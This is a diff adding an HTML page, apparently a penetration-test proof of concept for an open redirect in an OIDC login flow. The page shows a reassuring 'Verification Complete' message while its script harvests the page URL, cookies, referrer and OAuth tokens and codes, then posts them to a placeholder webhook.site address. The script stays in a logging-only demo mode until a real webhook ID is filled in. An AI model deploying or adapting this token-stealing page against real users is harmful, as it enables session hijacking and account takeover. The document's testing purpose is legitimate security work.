@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MyAdmin — Verification Complete</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #f0f2f5;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    margin: 0;
+  }
+  .box {
+    background: white;
+    border-radius: 12px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.1);
+    padding: 40px;
+    max-width: 420px;
+    text-align: center;
+  }
+  .check { font-size: 56px; color: #4caf50; margin-bottom: 16px; }
+  h1 { font-size: 20px; margin: 0 0 8px; color: #1a1a2e; }
+  p { font-size: 13px; color: #777; margin: 0; }
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="check">&#10003;</div>
+  <h1>Verification Complete</h1>
+  <p>Your session is secure. You may close this page.</p>
+</div>
+
+<script>
+/**
+ * capture.html — Open Redirect Landing Page
+ *
+ * This is where the victim lands if the open redirect (Finding #4) works.
+ * The URL fragment/hash may contain tokens from the OIDC flow.
+ *
+ * We:
+ * 1. Parse the URL for any tokens/codes
+ * 2. Exfiltrate them to the webhook
+ * 3. Show a benign "verification complete" message
+ */
+(function() {
+  var WEBHOOK = "https://webhook.site/YOUR_UUID_HERE";
+  var DEMO = WEBHOOK.indexOf("YOUR_UUID") > -1;
+
+  // Extract everything from the URL
+  var data = {
+    type: "OPEN_REDIRECT_LANDING",
+    href: location.href,
+    origin: location.origin,
+    pathname: location.pathname,
+    search: location.search,
+    hash: location.hash,
+    referrer: document.referrer,
+    cookies: document.cookie || "(none)",
+    timestamp: new Date().toISOString(),
+    ua: navigator.userAgent,
+  };
+
+  // Parse URL parameters
+  var params = new URLSearchParams(location.search);
+  var interesting = ["token","access_token","id_token","code","state","blob","returnUrl","return_url","auth"];
+  interesting.forEach(function(k) {
+    var v = params.get(k);
+    if (v) data[k] = v;
+  });
+
+  // Parse hash parameters (#access_token=...&id_token=...)
+  if (location.hash && location.hash.length > 1) {
+    try {
+      var hashParams = new URLSearchParams(location.hash.substring(1));
+      interesting.forEach(function(k) {
+        var v = hashParams.get(k);
+        if (v) data["hash_" + k] = v;
+      });
+    } catch(e) {}
+    data.raw_hash = location.hash;
+  }
+
+  console.log("[capture]", data);
+
+  if (!DEMO) {
+    var payload = JSON.stringify(data);
+
+    // sendBeacon
+    try {
+      navigator.sendBeacon(WEBHOOK, new Blob([payload], {type:"application/json"}));
+    } catch(e) {}
+
+    // fetch
+    try {
+      fetch(WEBHOOK, {method:"POST", body:payload, mode:"no-cors", keepalive:true});
+    } catch(e) {}
+  } else {
+    console.log("%c[DEMO] Would exfiltrate:", "color:#ff0;font-weight:bold", data);
+  }
+})();
+</script>
+</body>
+</html>
